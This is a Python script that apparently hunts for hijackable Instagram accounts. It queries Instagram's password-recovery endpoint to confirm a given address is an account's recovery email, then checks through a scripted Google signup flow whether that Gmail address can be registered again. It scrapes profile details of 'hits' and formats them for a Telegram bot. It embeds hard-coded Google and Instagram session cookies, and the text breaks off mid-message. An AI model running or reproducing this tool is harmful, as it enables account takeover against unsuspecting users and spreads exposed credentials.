import requests 
import re
import string 
import random
import uuid
from uuid import uuid4 
import threading 
from threading import Thread 
import requests
import json #@ zryvoox
import sys
import os
import time
R = "\x1b[38;5;196m" #lal
P = "\033[35m" #bengni
G = "\033[1;32m" #hra
C = "\033[36m" #fikka nilla
Y = "\033[1;33m" #pila
W = "\033[1;37m" #chita
LG = "\x1b[38;5;120m" #fikka hra
LP = "\x1b[38;5;218m" #fikka pila
LR = "\x1b[38;5;203m" #fikka lal
id = int(input(f"{R}Chat Id -> "))
tok = input(f"{P}Token -> ")
gi = 0
bi = 0
ge = 0
be = 0
def yex():
    os.system('clear')
    sys.stdout.write(
        f"{LG}𝐆𝐎𝐎𝐃 𝐈𝐆 {R}~ {LP}{gi}\n"
        f"{LG}𝐁𝐀𝐃 𝐈𝐆 {P}~ {LR}{bi}\n"
        f"{LG}𝐁𝐀𝐃 𝐄𝐌𝐀𝐈𝐋 {C}~ {LR}{be}\n"
        f"{LG}𝐇𝐈𝐓𝐒 {Y}~ {LP}{ge}\n"
    )
    sys.stdout.flush()
def A():
		url = "https://accounts.google.com/_/signup/validatepersonaldetails?hl=en-GB&_reqid=38089&rt=j"
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"AEThLlxCdD8K5zCvXb1xcaWY_KTgoSh-frrZUgqp7npf0nWnDpAyulpd4hSbTzPJ_PVZOckcUtbj\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
		  'azt': "AFoagUVjbxYG5c9JHU2BUBJf-3INPoJM_w:1762664676387",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:488",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-arch': "\"\"",
		  'sec-ch-ua-full-version': "\"124.0.6327.4\"",
		  'sec-ch-ua-platform-version': "\"14.0.0\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
		  'sec-ch-ua-bitness': "\"\"",
		  'sec-ch-ua-model': "\"SM-A235F\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CNv/ygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "OTZ=8324900_34_34__34_; SID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076; __Secure-1PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076; __Secure-3PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076; HSID=Am_2Ay_faDqTECJT8; SSID=A5UhpN4T2oDJwIwZI; APISID=qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t; SAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-1PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-3PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; ACCOUNT_CHOOSER=AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf; LSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076; __Host-1PLSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076; SEARCH_SAMESITE=CgQIp58B; __Host-3PLSID=o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076; AEC=AaJma5uneq5imp_XUGlRnrM7g4lmaZr8GIVeWINC7jfw2jWQ6ZMAFFoJNg; __Host-GAPS=1:uraP-bHLg84xQc-SxXw3yCbXg5L0L2g07i8eVWyNriXx_SRexRr1F4JXLLOQgHvEfsZprVq3m_IpfOnETbqAA34woAuCDQ:Mvx9STErAVI9gPwP; NID=526=g61GqTUhKuz3ylNR2_YhVIK_fSjztd4YgDfj_j0LQzh03QTTkwI9MDw6scGcJfViGaMtiRXtIh923N-fq7aeZLrk2wL_U4ta7aiNsN5-WEsJFPoyAuioVibJzTvzUcvWZZhexsPBewqcFoCGvYyAjdWqdwGpRoRNkeHOZTaxR6TFYvqXyxEIvnBm_EFH19sALEQHL-Ends6Z6jWUNHqpp-NGegcKYSrHoU42WtZjwJHa_oRX0i8I1q17PCzHci3i_q9Ru2gNvQYq0gAyYUO7aJ4V7FjmTKsi_b_Ty-XMOLXl-w-GxQuIoyT0N6-Xh5gWn3zGn_azyO4j0OIJ7hJXaQ0oq8m6v_M4FVZKuce0uXc7-izJ6g74l3Qu8kehCTI5; SIDCC=AKEyXzWGOBrBFdNL7jpnlsedfLd0GWQ0FiDxJzqb-C3NTwuBFmTJxxiKK7Id5N8OXoTNy7NddGE; __Secure-1PSIDCC=AKEyXzUAIWBhQb1emj8QNq9eU-CjT_Yg20P6EYX3iFJdl9WebA5oSR46pj2HD5mroZbToOK-Yc8; __Secure-3PSIDCC=AKEyXzVFM1hjc-9WU0yAsNsWdZpWbUZzEB-iVBFaTS2snvOjfyMd8m8HbHqiSFpx14-FydIFfHs"
		}
		response = requests.post(url, data=payload, headers=headers)
		cc = response.text
		tl = cc.split('"gf.ttu",null,"')[1].split('"')[0]
		url = f"https://accounts.google.com/_/signup/validatebasicinfo?hl=en-GB&TL={tl}&_reqid=238089&rt=j"
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': f"[\"TL:{tl}\",2015,4,2,2,null,null,0,null,null,0,0]",
		  'azt': "AFoagUVjbxYG5c9JHU2BUBJf-3INPoJM_w:1762664676387",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:488",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-arch': "\"\"",
		  'sec-ch-ua-full-version': "\"124.0.6327.4\"",
		  'sec-ch-ua-platform-version': "\"14.0.0\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
		  'sec-ch-ua-bitness': "\"\"",
		  'sec-ch-ua-model': "\"SM-A235F\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CNv/ygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL={tl}",
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "OTZ=8324900_34_34__34_; SID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076; __Secure-1PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076; __Secure-3PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076; HSID=Am_2Ay_faDqTECJT8; SSID=A5UhpN4T2oDJwIwZI; APISID=qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t; SAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-1PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-3PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; ACCOUNT_CHOOSER=AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf; LSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076; __Host-1PLSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076; SEARCH_SAMESITE=CgQIp58B; __Host-3PLSID=o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076; AEC=AaJma5uneq5imp_XUGlRnrM7g4lmaZr8GIVeWINC7jfw2jWQ6ZMAFFoJNg; __Host-GAPS=1:uraP-bHLg84xQc-SxXw3yCbXg5L0L2g07i8eVWyNriXx_SRexRr1F4JXLLOQgHvEfsZprVq3m_IpfOnETbqAA34woAuCDQ:Mvx9STErAVI9gPwP; NID=526=g61GqTUhKuz3ylNR2_YhVIK_fSjztd4YgDfj_j0LQzh03QTTkwI9MDw6scGcJfViGaMtiRXtIh923N-fq7aeZLrk2wL_U4ta7aiNsN5-WEsJFPoyAuioVibJzTvzUcvWZZhexsPBewqcFoCGvYyAjdWqdwGpRoRNkeHOZTaxR6TFYvqXyxEIvnBm_EFH19sALEQHL-Ends6Z6jWUNHqpp-NGegcKYSrHoU42WtZjwJHa_oRX0i8I1q17PCzHci3i_q9Ru2gNvQYq0gAyYUO7aJ4V7FjmTKsi_b_Ty-XMOLXl-w-GxQuIoyT0N6-Xh5gWn3zGn_azyO4j0OIJ7hJXaQ0oq8m6v_M4FVZKuce0uXc7-izJ6g74l3Qu8kehCTI5; SIDCC=AKEyXzWGOBrBFdNL7jpnlsedfLd0GWQ0FiDxJzqb-C3NTwuBFmTJxxiKK7Id5N8OXoTNy7NddGE; __Secure-1PSIDCC=AKEyXzUAIWBhQb1emj8QNq9eU-CjT_Yg20P6EYX3iFJdl9WebA5oSR46pj2HD5mroZbToOK-Yc8; __Secure-3PSIDCC=AKEyXzVFM1hjc-9WU0yAsNsWdZpWbUZzEB-iVBFaTS2snvOjfyMd8m8HbHqiSFpx14-FydIFfHs"
		} #team 7x
		response = requests.post(url, data=payload, headers=headers)
		yy = response.text
		ttl = json.loads(re.sub(r'^\)\]\}\'\n?', '', yy))[0][0][4].strip().replace('TL:', '', 1)
		with open("aesowns.txt", "w") as goat:
			goat.write(ttl)
from multiprocessing import Process
p = Process(target=A)
p.start()
def CforChutiya(x):
    global gi,bi
    url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
    payload = {
        'signed_body': 'SIGNATURE.' + json.dumps({
            "adid": "16ad268f-b6c3-4b9d-88f0-6a07c03b2165",
            "guid": "87598b92-d663-4f58-9b97-e4aed5b095c1",
            "device_id": "android-16bafe60fc08b7ed",
            "query": f"{x}",
            "waterfall_id": "0b5460df-de5a-4c2a-b5f2-52547be80fec"
        })
    }
    headers = {
        'User-Agent': "Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; msm8996; en_US; 545986883)",
        'Accept-Encoding': "zstd",
        'accept-language': "en-US",
        'ig-intended-user-id': "0",
        'priority': "u=3",
        'x-bloks-is-layout-rtl': "false",
        'x-bloks-is-prism-enabled': "true",
        'x-bloks-prism-button-version': "0",
        'x-bloks-version-id': "8c9c28282f690772f23fcf9061954c93eeec8c673d2ec49d860dabf5dea4ca27",
        'x-fb-client-ip': "True",
        'x-fb-connection-type': "WIFI",
        'x-fb-friendly-name': "IgApi: accounts/send_recovery_flow_email/",
        'x-fb-request-analytics-tags': "{\"network_tags\":{\"product\":\"567067343352427\",\"purpose\":\"fetch\",\"surface\":\"undefined\",\"request_category\":\"api\",\"retry_attempt\":\"0\"}}",
        'x-fb-server-cluster': "True",
        'x-ig-android-id': "android-16bafe60fc08b7ed",
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_US",
        'x-ig-bandwidth-speed-kbps': "923.000",
        'x-ig-bandwidth-totalbytes-b': "0",
        'x-ig-bandwidth-totaltime-ms': "0",
        'x-ig-client-endpoint': "user_password_recovery",
        'x-ig-capabilities': "3brTv10=",
        'x-ig-connection-type': "WIFI",
        'x-ig-device-id': "87598b92-d663-4f58-9b97-e4aed5b095c1",
        'x-ig-device-locale': "en_US",
        'x-ig-family-device-id': "8871ade9-534d-4386-b10e-55844c16c3eb",
        'x-ig-mapped-locale': "en_US",
        'x-ig-timezone-offset': "19800",
        'x-ig-www-claim': "0",
        'x-mid': "aQlvZgABAAEtY7aX61V6hA61FKKp",
        'x-tigon-is-retry': "False",
        'x-fb-http-engine': "MNS",
        'x-fb-rmd': "state=URL_ELIGIBLE"
    }
    response = requests.post(url, data=payload, headers=headers)
    try:
        j = response.json()
        e = j.get('email', None)
        if e:
            if x == e:
                gi+=1
                yex()
                aesowns(x)
            else:
                bi+=1
                yex()
        else:
            bi+=1
            yex()
    except:
        bi+=1
        yex()
def mela(xxx):
    url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
    payload = {
        'signed_body': 'SIGNATURE.' + json.dumps({
            "adid": "16ad268f-b6c3-4b9d-88f0-6a07c03b2165",
            "guid": "87598b92-d663-4f58-9b97-e4aed5b095c1",
            "device_id": "android-16bafe60fc08b7ed",
            "query": f"{xxx}",
            "waterfall_id": "0b5460df-de5a-4c2a-b5f2-52547be80fec"
        })
    }
    headers = {
        'User-Agent': "Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; msm8996; en_US; 545986883)",
        'Accept-Encoding': "zstd",
        'accept-language': "en-US",
        'ig-intended-user-id': "0",
        'priority': "u=3",
        'x-bloks-is-layout-rtl': "false",
        'x-bloks-is-prism-enabled': "true",
        'x-bloks-prism-button-version': "0",
        'x-bloks-version-id': "8c9c28282f690772f23fcf9061954c93eeec8c673d2ec49d860dabf5dea4ca27",
        'x-fb-client-ip': "True",
        'x-fb-connection-type': "WIFI",
        'x-fb-friendly-name': "IgApi: accounts/send_recovery_flow_email/",
        'x-fb-request-analytics-tags': "{\"network_tags\":{\"product\":\"567067343352427\",\"purpose\":\"fetch\",\"surface\":\"undefined\",\"request_category\":\"api\",\"retry_attempt\":\"0\"}}",
        'x-fb-server-cluster': "True",
        'x-ig-android-id': "android-16bafe60fc08b7ed",
        'x-ig-app-id': "567067343352427",
        'x-ig-device-id': "87598b92-d663-4f58-9b97-e4aed5b095c1",
        'x-ig-device-locale': "en_US",
        'x-ig-family-device-id': "8871ade9-534d-4386-b10e-55844c16c3eb",
        'x-mid': "aQlvZgABAAEtY7aX61V6hA61FKKp",
    }
    response = requests.post(url, data=payload, headers=headers)
    try:
    	j = response.json()
    	e = j.get('email', {})
    except:
    	pass
    return e
def aesowns(y):
	global ge,be
	x = y.split("@")[0]
	with open("aesowns.txt", "r") as legend:
		ttl = legend.read().strip()
	url = f"https://accounts.google.com/_/signup/usernameavailability?hl=en-GB&TL={ttl}&_reqid=438089&rt=j"
	payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': f"[\"TL:{ttl}\",\"{x}\",1,0,1,null,0,27715]",
		  'azt': "AFoagUVjbxYG5c9JHU2BUBJf-3INPoJM_w:1762664676387",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:488",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
	headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-arch': "\"\"",
		  'sec-ch-ua-full-version': "\"124.0.6327.4\"",
		  'sec-ch-ua-platform-version': "\"14.0.0\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
		  'sec-ch-ua-bitness': "\"\"",
		  'sec-ch-ua-model': "\"SM-A235F\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CNv/ygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': f"https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL={ttl}",
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "OTZ=8324900_34_34__34_; SID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076; __Secure-1PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076; __Secure-3PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076; HSID=Am_2Ay_faDqTECJT8; SSID=A5UhpN4T2oDJwIwZI; APISID=qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t; SAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-1PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-3PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; ACCOUNT_CHOOSER=AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf; LSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076; __Host-1PLSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076; SEARCH_SAMESITE=CgQIp58B; __Host-3PLSID=o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076; AEC=AaJma5uneq5imp_XUGlRnrM7g4lmaZr8GIVeWINC7jfw2jWQ6ZMAFFoJNg; __Host-GAPS=1:uraP-bHLg84xQc-SxXw3yCbXg5L0L2g07i8eVWyNriXx_SRexRr1F4JXLLOQgHvEfsZprVq3m_IpfOnETbqAA34woAuCDQ:Mvx9STErAVI9gPwP; NID=526=g61GqTUhKuz3ylNR2_YhVIK_fSjztd4YgDfj_j0LQzh03QTTkwI9MDw6scGcJfViGaMtiRXtIh923N-fq7aeZLrk2wL_U4ta7aiNsN5-WEsJFPoyAuioVibJzTvzUcvWZZhexsPBewqcFoCGvYyAjdWqdwGpRoRNkeHOZTaxR6TFYvqXyxEIvnBm_EFH19sALEQHL-Ends6Z6jWUNHqpp-NGegcKYSrHoU42WtZjwJHa_oRX0i8I1q17PCzHci3i_q9Ru2gNvQYq0gAyYUO7aJ4V7FjmTKsi_b_Ty-XMOLXl-w-GxQuIoyT0N6-Xh5gWn3zGn_azyO4j0OIJ7hJXaQ0oq8m6v_M4FVZKuce0uXc7-izJ6g74l3Qu8kehCTI5; SIDCC=AKEyXzWGOBrBFdNL7jpnlsedfLd0GWQ0FiDxJzqb-C3NTwuBFmTJxxiKK7Id5N8OXoTNy7NddGE; __Secure-1PSIDCC=AKEyXzUAIWBhQb1emj8QNq9eU-CjT_Yg20P6EYX3iFJdl9WebA5oSR46pj2HD5mroZbToOK-Yc8; __Secure-3PSIDCC=AKEyXzVFM1hjc-9WU0yAsNsWdZpWbUZzEB-iVBFaTS2snvOjfyMd8m8HbHqiSFpx14-FydIFfHs"
		}
	response = requests.post(url, data=payload, headers=headers)
	try:
	   	ss = response.text
	   	if '"gf.uar",1' in ss:
	   		ge+=1
	   		yex()
	   		e = mela(y)
	   		mkbAAAGG(id, tok, x, y, e)
	   	else:
	   		be+=1
	   		yex()
	except:
	   	 be+=1
	   	 yex()
def mkbAAAGG(id, tok, x, y, e):
	global ge
	if e:
		z = e
	else:
		z = 'Chud Gya Acc' #@cxqok
	cookies = {
    'mid': 'aQLm1gABAAE842f-IkSwe_vjC30a',
    'datr': '1eYCaXxZangEyVhuLFgYLFCM',
    'ig_did': '997BCE58-8A0A-44B9-97D3-868C981F2DB0',
    'ig_nrcb': '1',
    'dpr': '3.558248996734619',
    'ps_l': '1',
    'ps_n': '1',
    'csrftoken': 'BrM4F9TcAaJy5kCVO6tkCzXUY9lThyA0',
    'ds_user_id': '77860645604',
    'wd': '774x845',
    'rur': '"CCO\\05477860645604\\0541793941896:01fe3f8e187c4b9cbcaaf0a5a8be54faad8276eea4b5de4641eafb3ab47fb3900fea71fe"',
    }
	headers = {
	'authority': 'www.instagram.com',
	'accept': '*/*',
	'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
	'content-type': 'application/x-www-form-urlencoded',
	'origin': 'https://www.instagram.com',
	'sec-ch-prefers-color-scheme': 'dark',
	'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-model': '""',
	'sec-ch-ua-platform': '"Linux"',
	'sec-ch-ua-platform-version': '""',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-origin',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
	'x-asbd-id': '359341',
	'x-bloks-version-id': 'd7f0b12c66f34de23c1ac5eac443d9a366d893bea40a59421b41d3e5b2361a10',
	'x-csrftoken': 'BrM4F9TcAaJy5kCVO6tkCzXUY9lThyA0',
	'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
	'x-fb-lsd': 'xePp2U8W-LJ5I0vYcar2UA',
	'x-ig-app-id': '936619743392459',
	'referer': f'https://www.instagram.com/{x}/',
	}
	params = {
	'username': x,
	}
	try:
		response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/', headers=headers, params=params, cookies=cookies)
		data = response.text
		js = response.json()
		ud = js.get('data', {}).get('user', {})
		u = ud.get('username', None)
		fn = ud.get('full_name', None)
		b = ud.get('biography', None)
		f1 = ud.get('edge_followed_by', {}).get('count', 0)
		f2 = ud.get('edge_follow', {}).get('count', 0)
		p = ud.get('is_private', None)
		p1 = ud.get('edge_owner_to_timeline_media', {}).get('count', 0)
		biz = ud.get('is_business_account', None)
		if f1 > 10 and p1 > 3:
			m = 'True'
		else:
			m = 'False'
		x = u if u else info
		msg = f"""
╔══════🎯 𝗛𝗜𝗧 𝗙𝗢𝗨𝗡𝗗 ══════╗

🏢 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀: {biz}
🌐 𝗠𝗲𝘁𝗮 𝗘𝗻𝗮𝗯𝗹𝗲𝗱: {m}
👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀: {f1}
➡️ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴: {f2}
📸 𝗣𝗼𝘀𝘁𝘀: {p1}
📝 𝗕𝗶𝗼: {b}

🔒 𝗣𝗿𝗶𝘃𝗮𝘁𝗲: {p}
🧾 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {fn}
👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{x}

📨 𝗘𝗺𝗮𝗶𝗹: {y}
🧪 𝗢𝗯𝗳𝘂𝘀 𝗘𝗺𝗮𝗶𝗹: {z}

🔗 𝗨𝗥𝗟: https://www.instagram.com/{x}

👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @aesowns 
╚══════════════════════╝
"""
	except:
		msg = f"""
╔══════🎯 𝗛𝗜𝗧 𝗙𝗢𝗨𝗡𝗗 ══════╗

🏢 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀: {biz}
🌐 𝗠𝗲𝘁𝗮 𝗘𝗻𝗮𝗯𝗹𝗲𝗱: {m}
👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀: {f1}
➡️ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴: {f2}
